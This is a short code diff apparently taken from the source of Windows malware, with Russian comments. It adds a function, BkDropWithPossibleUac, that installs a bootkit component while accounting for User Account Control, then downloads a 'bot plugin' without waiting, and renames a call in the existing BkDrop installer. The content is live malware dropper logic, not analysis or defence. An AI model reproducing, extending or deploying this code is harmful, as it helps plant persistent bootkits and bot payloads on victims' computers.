@@ -719,13 +719,28 @@ BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 	return FALSE;
 }
 
+BOOL WINAPI BkDropWithPossibleUac(const void* SelfBody, DWORD SelfBodySize)
+{
+	ResetBootkitLoaderFlag();
+
+	// Устанавливаем буткит часть с учетов возможного UAC
+	bool InstallResult = BkDeployAndInstallWithPossibleUac(SelfBody, SelfBodySize);
+	LDRDBG("BkDropWithPossibleUac", "BkDeployAndInstallWithPossibleUac return %d", InstallResult);
+
+	if (InstallResult == false) return FALSE;
+
+	// Если получается установить - скачиваем ботплаг.
+	// Закачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
+	return LoadPlugToCache(FALSE, 0);
+}
+
 BOOL WINAPI BkDrop()
 {
 	ResetBootkitLoaderFlag();
 
 	// Устанавливаем буткит часть
 	// Если получается установить - скачиваем ботплаг.
-	bool InstallResult = DeployAndInstallBkDll();
+	bool InstallResult = BkDeployAndInstallDll();
 	LDRDBG("BkDrop", "DeployAndInstallBkDll return %d", InstallResult);
 
 	if (InstallResult == false) return FALSE;
